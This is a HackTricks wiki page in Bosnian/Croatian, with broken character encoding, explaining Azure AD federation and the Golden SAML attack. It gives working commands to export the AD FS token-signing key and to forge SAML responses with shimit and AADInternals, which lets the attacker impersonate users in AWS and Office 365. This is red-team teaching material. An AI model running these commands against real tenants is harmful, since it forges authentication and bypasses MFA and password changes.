# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Osnovne Informacije

[Iz dokumenata:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federacija** je kolekcija **domena** koje su uspostavile **povjerenje**. Nivo povjerenja moÅ¾e varirati, ali obiÄno ukljuÄuje **autentifikaciju** i gotovo uvijek ukljuÄuje **autorizaciju**. TipiÄna federacija moÅ¾e ukljuÄivati **broj organizacija** koje su uspostavile **povjerenje** za **zajedniÄki pristup** skupu resursa.

MoÅ¾ete **federirati vaÅ¡u on-premises** okolinu **sa Azure AD** i koristiti ovu federaciju za autentifikaciju i autorizaciju. Ova metoda prijave osigurava da se sva korisniÄka **autentifikacija odvija on-premises**. Ova metoda omoguÄ‡ava administratorima da implementiraju rigoroznije nivoe kontrole pristupa. Federacija sa **AD FS** i PingFederate je dostupna.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

U suÅ¡tini, u Federaciji, sva **autentifikacija** se odvija u **on-prem** okruÅ¾enju i korisnik doÅ¾ivljava SSO u svim pouzdanim okruÅ¾enjima. Dakle, korisnici mogu **pristupiti** **cloud** aplikacijama koristeÄ‡i svoje **on-prem kredencijale**.

**Security Assertion Markup Language (SAML)** se koristi za **razmjenu** svih informacija o autentifikaciji i autorizaciji **izmeÄ‘u provajdera**.

U bilo kojoj federacijskoj postavci postoje tri strane:

* Korisnik ili Klijent
* Identity Provider (IdP)
* Service Provider (SP)

(Slike sa https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. U poÄetku, aplikaciju (Service Provider ili SP, kao Å¡to je AWS konzola ili vSphere web klijent) pristupa korisnik. Ovaj korak moÅ¾e biti preskoÄen, vodeÄ‡i klijenta direktno do IdP (Identity Provider) zavisno o specifiÄnoj implementaciji.
2. Nakon toga, SP identifikuje odgovarajuÄ‡i IdP (npr. AD FS, Okta) za autentifikaciju korisnika. Zatim kreira SAML (Security Assertion Markup Language) AuthnRequest i preusmjerava klijenta na odabrani IdP.
3. IdP preuzima, autentifikuje korisnika. Nakon autentifikacije, IdP formira SAMLResponse i prosljeÄ‘uje ga SP preko korisnika.
4. Na kraju, SP procjenjuje SAMLResponse. Ako je uspjeÅ¡no validiran, Å¡to implicira povjerenje sa IdP, korisniku se odobrava pristup. Ovo oznaÄava zavrÅ¡etak procesa prijave, omoguÄ‡avajuÄ‡i korisniku da koristi uslugu.

**Ako Å¾elite saznati viÅ¡e o SAML autentifikaciji i uobiÄajenim napadima, idite na:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS je model identiteta zasnovan na tvrdnjama.
* "..tvrdnje su jednostavno izjave (na primjer, ime, identitet, grupa), napravljene o korisnicima, koje se koriste prvenstveno za autorizaciju pristupa aplikacijama zasnovanim na tvrdnjama koje se nalaze bilo gdje na internetu."
* Tvrdnje za korisnika su napisane unutar SAML tokena i zatim su potpisane kako bi se osigurala povjerljivost od strane IdP.
* Korisnik je identifikovan pomoÄ‡u ImmutableID. To je globalno jedinstveno i pohranjeno u Azure AD.
* ImmutableID je pohranjen on-prem kao ms-DS-ConsistencyGuid za korisnika i/ili se moÅ¾e izvesti iz GUID korisnika.
* ViÅ¡e informacija na [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML napad:**

* U ADFS, SAML Response je potpisan certifikatom za potpisivanje tokena.
* Ako je certifikat kompromitovan, moguÄ‡e je autentifikovati se na Azure AD kao BILO KOJI korisnik sinhronizovan sa Azure AD!
* Kao i kod naÅ¡eg PTA zloupotrebe, promjena lozinke za korisnika ili MFA neÄ‡e imati nikakav efekat jer mi falsifikujemo odgovor na autentifikaciju.
* Certifikat se moÅ¾e izvuÄ‡i sa AD FS servera sa DA privilegijama i zatim se moÅ¾e koristiti sa bilo kojeg ureÄ‘aja povezanog na internet.
* ViÅ¡e informacija na [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Proces u kojem **Identity Provider (IdP)** proizvodi **SAMLResponse** za autorizaciju prijave korisnika je kljuÄan. Zavisno o specifiÄnoj implementaciji IdP-a, **odgovor** moÅ¾e biti **potpisan** ili **Å¡ifrovan** koristeÄ‡i **privatni kljuÄ IdP-a**. Ovaj postupak omoguÄ‡ava **Service Provider (SP)** da potvrdi autentiÄnost SAMLResponse, osiguravajuÄ‡i da je zaista izdat od strane pouzdanog IdP-a.

Paralela se moÅ¾e povuÄ‡i sa [golden ticket napadom](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), gdje se kljuÄ koji autentifikuje identitet i dozvole korisnika (KRBTGT za golden tickets, privatni kljuÄ za potpisivanje tokena za golden SAML) moÅ¾e manipulirati kako bi se **falsifikovao objekt autentifikacije** (TGT ili SAMLResponse). Ovo omoguÄ‡ava imitaciju bilo kojeg korisnika, dajuÄ‡i neovlaÅ¡teni pristup SP-u.

Golden SAML nudi odreÄ‘ene prednosti:

* Mogu se **kreirati na daljinu**, bez potrebe da budu dio domene ili federacije u pitanju.
* Ostaju efikasni Äak i sa **Two-Factor Authentication (2FA)** omoguÄ‡enim.
* Privatni kljuÄ za potpisivanje tokena **ne obnavlja se automatski**.
* **Promjena lozinke korisnika ne poniÅ¡tava** veÄ‡ generisani SAML.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) je Microsoftova usluga koja omoguÄ‡ava **sigurnu razmjenu informacija o identitetu** izmeÄ‘u pouzdanih poslovnih partnera (federacija). U suÅ¡tini, omoguÄ‡ava domen servisu da dijeli korisniÄke identitete sa drugim provajderima usluga unutar federacije.

Sa AWS-om koji vjeruje kompromitovanom domenu (u federaciji), ova ranjivost se moÅ¾e iskoristiti za potencijalno **sticanje bilo kojih dozvola u AWS okruÅ¾enju**. Napad zahtijeva **privatni kljuÄ koriÅ¡ten za potpisivanje SAML objekata**, sliÄno kao Å¡to je potreban KRBTGT u golden ticket napadu. Pristup korisniÄkom raÄunu AD FS-a je dovoljan za dobijanje ovog privatnog kljuÄa.

Za izvrÅ¡enje golden SAML napada potrebni su:

* **Privatni kljuÄ za potpisivanje tokena**
* **Javni certifikat IdP-a**
* **Ime IdP-a**
* **Ime uloge (uloga koju treba preuzeti)**
* Domain\username
* Ime sesije uloge u AWS-u
* Amazon ID raÄuna

_Samo su stavke u boldu obavezne. Ostale se mogu popuniti po Å¾elji._

Da biste dobili **privatni kljuÄ**, potreban je pristup **korisniÄkom raÄunu AD FS-a**. Odatle, privatni kljuÄ se moÅ¾e **izvesti iz liÄne pohrane** koristeÄ‡i alate kao Å¡to je [mimikatz](https://github.com/gentilkiwi/mimikatz). Da biste prikupili ostale potrebne informacije, moÅ¾ete koristiti Microsoft.Adfs.Powershell snapin na sledeÄ‡i naÄin, osiguravajuÄ‡i da ste prijavljeni kao ADFS korisnik:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Sa svim informacijama, moguÄ‡e je zaboraviti validan SAMLResponse kao korisnik kojeg Å¾elite da se laÅ¾no predstavite koristeÄ‡i [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
TakoÄ‘e je moguÄ‡e kreirati ImmutableID za korisnike samo u oblaku i laÅ¾no se predstavljati kao oni
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Reference

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
NauÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
